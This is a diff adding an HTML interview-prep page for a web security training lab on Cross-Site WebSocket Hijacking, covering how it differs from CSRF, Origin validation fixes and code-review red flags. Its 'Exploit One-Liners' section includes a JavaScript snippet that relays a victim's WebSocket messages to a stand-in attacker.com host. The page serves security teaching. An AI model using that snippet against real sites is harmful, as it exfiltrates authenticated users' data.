@@ -1,0 +1,278 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>X5 Interview Prep — Cross-Site WebSocket Hijacking | Hunt Labs</title>
+  <link rel="stylesheet" href="assets/style.css" />
+</head>
+<body>
+
+<nav class="nav">
+  <div class="nav-inner">
+    <a href="index.html" class="nav-logo">[ HUNT ]</a>
+    <div class="nav-links">
+      <a href="index.html">Hub</a>
+      <a href="x5.html">X5 Lab</a>
+      <a href="x5_interview.html" class="active">Interview Prep</a>
+    </div>
+    <div class="nav-counter" id="solved-counter">
+      <span class="solved-num">0</span> / 5 solved
+    </div>
+  </div>
+</nav>
+
+<div class="interview-page">
+
+  <div class="interview-back">
+    <a href="x5.html" class="btn btn-ghost btn-sm">&#8592; Back to Lab X5</a>
+    <a href="index.html" class="btn btn-ghost btn-sm">&#8962; Hub</a>
+  </div>
+
+  <div class="interview-header">
+    <div style="display:flex;gap:8px;margin-bottom:10px;">
+      <span class="badge badge-lab">LAB X5</span>
+      <span class="badge badge-advanced">Advanced</span>
+    </div>
+    <h1>Interview Prep — Cross-Site WebSocket Hijacking</h1>
+    <p>Senior-level interview questions on CSWSH, how it differs from CSRF, why SOP doesn't protect WebSockets, and correct server-side defenses.</p>
+  </div>
+
+  <!-- 30-second explanation -->
+  <div class="interview-section">
+    <h2>30-Second Explanation</h2>
+    <div class="thirty-sec">
+      Cross-Site WebSocket Hijacking (CSWSH) exploits the fact that browsers include
+      cookies in WebSocket upgrade requests but the Same-Origin Policy does <em>not</em>
+      block cross-origin WebSocket connections. If the WebSocket server authenticates
+      users via cookies and does not validate the <code>Origin</code> header on the
+      upgrade request, any web page can silently open a WebSocket to the server as the
+      authenticated victim and read all messages — including data the server believes it
+      is sending only to trusted pages. This is analogous to CSRF for read-only channels,
+      but more dangerous because the attacker can also exfiltrate the server's responses
+      via <code>ws.onmessage</code>. The fix is server-side: validate the <code>Origin</code>
+      header during the HTTP upgrade handshake, and additionally use CSRF tokens for
+      WebSocket authentication if Origin alone is insufficient.
+    </div>
+  </div>
+
+  <!-- Q&A -->
+  <div class="interview-section">
+    <h2>Q &amp; A</h2>
+
+    <div class="qa-item">
+      <div class="qa-question">
+        <input type="checkbox" class="qa-check" />
+        <span class="qa-q-text">How is CSWSH different from CSRF?</span>
+        <span class="qa-chevron">&#9660;</span>
+      </div>
+      <div class="qa-answer">
+        Both attacks exploit the fact that browsers automatically include credentials
+        (cookies) in cross-origin requests — but they target different channels:
+        <table style="width:100%;border-collapse:collapse;font-size:13px;margin-top:10px;">
+          <tr style="background:var(--surface-2);">
+            <th style="padding:8px;text-align:left;color:var(--text-muted);border-bottom:1px solid var(--border);">Property</th>
+            <th style="padding:8px;text-align:left;color:var(--text-muted);border-bottom:1px solid var(--border);">CSRF</th>
+            <th style="padding:8px;text-align:left;color:var(--text-muted);border-bottom:1px solid var(--border);">CSWSH</th>
+          </tr>
+          <tr>
+            <td style="padding:8px;border-bottom:1px solid var(--border-muted);">Protocol</td>
+            <td style="padding:8px;border-bottom:1px solid var(--border-muted);">HTTP</td>
+            <td style="padding:8px;border-bottom:1px solid var(--border-muted);">WebSocket</td>
+          </tr>
+          <tr>
+            <td style="padding:8px;border-bottom:1px solid var(--border-muted);">Attacker can read response?</td>
+            <td style="padding:8px;border-bottom:1px solid var(--border-muted);">No (SOP blocks)</td>
+            <td style="padding:8px;border-bottom:1px solid var(--border-muted);">Yes (SOP doesn't apply to WS)</td>
+          </tr>
+          <tr>
+            <td style="padding:8px;border-bottom:1px solid var(--border-muted);">Primary goal</td>
+            <td style="padding:8px;border-bottom:1px solid var(--border-muted);">State-changing actions</td>
+            <td style="padding:8px;border-bottom:1px solid var(--border-muted);">Data exfiltration + actions</td>
+          </tr>
+          <tr>
+            <td style="padding:8px;">Common mitigation</td>
+            <td style="padding:8px;">CSRF token / SameSite cookies</td>
+            <td style="padding:8px;">Origin header validation</td>
+          </tr>
+        </table>
+        CSWSH is generally more severe: the attacker can both send messages <em>as</em>
+        the victim and read the server's replies in real time.
+      </div>
+    </div>
+
+    <div class="qa-item">
+      <div class="qa-question">
+        <input type="checkbox" class="qa-check" />
+        <span class="qa-q-text">Why doesn't the Same-Origin Policy protect WebSockets?</span>
+        <span class="qa-chevron">&#9660;</span>
+      </div>
+      <div class="qa-answer">
+        The SOP was designed for the HTTP request-response model: the browser sends the
+        request but blocks JS from reading a cross-origin response. WebSockets use a
+        fundamentally different model — after the HTTP upgrade handshake, the connection
+        becomes a persistent bidirectional stream, and all subsequent frames are outside
+        the HTTP model the SOP was designed around.
+        <br/><br/>
+        Specifically: the browser does <em>not</em> block cross-origin WebSocket connection
+        establishment. The <code>Origin</code> header is sent with the upgrade request, but
+        it is up to the <em>server</em> to check and reject it. If the server doesn't
+        validate the origin, the browser happily completes the handshake and gives the
+        attacker full read/write access to the socket.
+      </div>
+    </div>
+
+    <div class="qa-item">
+      <div class="qa-question">
+        <input type="checkbox" class="qa-check" />
+        <span class="qa-q-text">What headers should a WebSocket server validate on connection?</span>
+        <span class="qa-chevron">&#9660;</span>
+      </div>
+      <div class="qa-answer">
+        <ul style="color:var(--text-muted);font-size:14px;line-height:1.9;">
+          <li><strong><code>Origin</code></strong> — the most important. Reject connections from unexpected origins with a 403 or a <code>ws.close(4001, 'Forbidden')</code>.</li>
+          <li><strong>Session / authentication token</strong> — cookies are sent automatically; but also support token-in-URL or a protocol-level handshake token as a secondary check.</li>
+          <li><strong>CSRF token</strong> — for applications where <code>Origin</code> alone is insufficient (e.g., you need to trust multiple third-party origins), include a nonce in the WS URL or first message and validate it.</li>
+        </ul>
+        <pre><code>wss.on('connection', (ws, req) => {
+  const origin = req.headers.origin;
+  const ALLOWED = ['https://app.example.com'];
+  if (!ALLOWED.includes(origin)) {
+    ws.close(4001, 'Forbidden origin');
+    return;
+  }
+  // … proceed
+});</code></pre>
+      </div>
+    </div>
+
+    <div class="qa-item">
+      <div class="qa-question">
+        <input type="checkbox" class="qa-check" />
+        <span class="qa-q-text">Does SameSite=Strict on the session cookie prevent CSWSH?</span>
+        <span class="qa-chevron">&#9660;</span>
+      </div>
+      <div class="qa-answer">
+        <code>SameSite=Strict</code> or <code>SameSite=Lax</code> prevents the cookie from
+        being sent on cross-site requests — which would block the attack if fully enforced.
+        However, there are important nuances:
+        <ul style="color:var(--text-muted);font-size:14px;line-height:1.9;margin-top:8px;">
+          <li>Browser SameSite support varies and has edge cases (e.g., top-level navigation for Lax).</li>
+          <li>The cookie may be served without a SameSite attribute — legacy behaviour defaults to <code>None</code> in older browsers.</li>
+          <li>SameSite is a defence-in-depth measure, not a replacement for Origin header validation on the server.</li>
+          <li>Best practice: use both <code>SameSite=Strict</code> cookies <em>and</em> server-side Origin validation.</li>
+        </ul>
+      </div>
+    </div>
+
+    <div class="qa-item">
+      <div class="qa-question">
+        <input type="checkbox" class="qa-check" />
+        <span class="qa-q-text">How do you test for CSWSH in a bug bounty or pentest?</span>
+        <span class="qa-chevron">&#9660;</span>
+      </div>
+      <div class="qa-answer">
+        <ol style="color:var(--text-muted);font-size:14px;line-height:1.9;">
+          <li>In Burp Suite, proxy the WebSocket upgrade request. In Burp Repeater, change the <code>Origin</code> header to an attacker domain. Observe whether the server accepts the connection.</li>
+          <li>If accepted, write a minimal PoC HTML page that opens a WebSocket to the victim server and logs all <code>onmessage</code> data.</li>
+          <li>Check for authentication: does the server send different data when the cookie is present vs. absent? This confirms the vulnerability is exploitable against an authenticated victim.</li>
+          <li>Also test: send messages as the victim (state-changing operations over WS) to assess full impact.</li>
+        </ol>
+      </div>
+    </div>
+
+  </div>
+
+  <!-- Bypass one-liners -->
+  <div class="interview-section">
+    <h2>Exploit One-Liners</h2>
+
+    <div class="oneliner">
+      const ws = new WebSocket('wss://victim.com/ws/feed');
+      ws.onmessage = e => fetch('https://attacker.com/log?d=' + encodeURIComponent(e.data));
+    </div>
+    <p style="font-size:13px;color:var(--text-muted);margin-bottom:12px;">
+      Placed on an attacker page — browser sends victim's session cookie automatically. All messages exfiltrated.
+    </p>
+
+    <div class="oneliner">
+      // Burp Repeater — test Origin bypass:
+      // Change header: Origin: https://evil.attacker.com
+      // If server returns 101 → vulnerable
+    </div>
+  </div>
+
+  <!-- Developer Fix -->
+  <div class="interview-section">
+    <h2>Developer Fix</h2>
+    <div class="fix-box">
+      <p style="color:var(--green);font-weight:600;margin-bottom:8px;">Server-side Origin validation on WebSocket upgrade</p>
+      <pre><code>const ALLOWED_ORIGINS = new Set([
+  'https://app.example.com',
+  'https://admin.example.com',
+]);
+
+wss.on('connection', (ws, req) => {
+  const origin = req.headers.origin;
+
+  // Reject all unknown origins
+  if (!origin || !ALLOWED_ORIGINS.has(origin)) {
+    ws.close(4001, 'Connection refused: invalid origin');
+    return;
+  }
+
+  // Optionally validate a CSRF token passed in the URL:
+  const url   = new URL(req.url, 'http://localhost');
+  const token = url.searchParams.get('token');
+  if (!validateCsrfToken(req, token)) {
+    ws.close(4002, 'Connection refused: invalid token');
+    return;
+  }
+
+  // Authenticated, known-origin connection — proceed
+  ws.send(JSON.stringify({ type: 'welcome' }));
+});</code></pre>
+      <p style="font-size:13px;color:var(--text-muted);margin-top:10px;">
+        Also set <code>SameSite=Strict</code> on session cookies as a defence-in-depth layer.
+      </p>
+    </div>
+  </div>
+
+  <!-- Red Flags -->
+  <div class="interview-section">
+    <h2>Red Flags in Code Review</h2>
+
+    <div class="red-flag-item">
+      <span class="red-flag-icon">&#9888;</span>
+      <span><code>wss.on('connection', (ws, req) =&gt; { ... })</code> with no <code>req.headers.origin</code> check</span>
+    </div>
+    <div class="red-flag-item">
+      <span class="red-flag-icon">&#9888;</span>
+      <span>WebSocket authentication based only on cookies without any Origin or CSRF validation</span>
+    </div>
+    <div class="red-flag-item">
+      <span class="red-flag-icon">&#9888;</span>
+      <span>Server sends sensitive per-user data in the <code>onconnect</code> welcome message to all connections</span>
+    </div>
+    <div class="red-flag-item">
+      <span class="red-flag-icon">&#9888;</span>
+      <span>Session cookie without <code>SameSite</code> attribute — defaults to cross-site in many browsers</span>
+    </div>
+    <div class="red-flag-item">
+      <span class="red-flag-icon">&#9888;</span>
+      <span>Assuming WebSocket is safe "because it's not HTTP" — the WS handshake is HTTP and shares HTTP cookie rules</span>
+    </div>
+  </div>
+
+</div>
+
+<script src="assets/main.js"></script>
+<script>
+  document.querySelectorAll('.qa-question').forEach(q => {
+    q.addEventListener('click', () => {
+      q.closest('.qa-item').classList.toggle('open');
+    });
+  });
+</script>
+</body>
+</html>
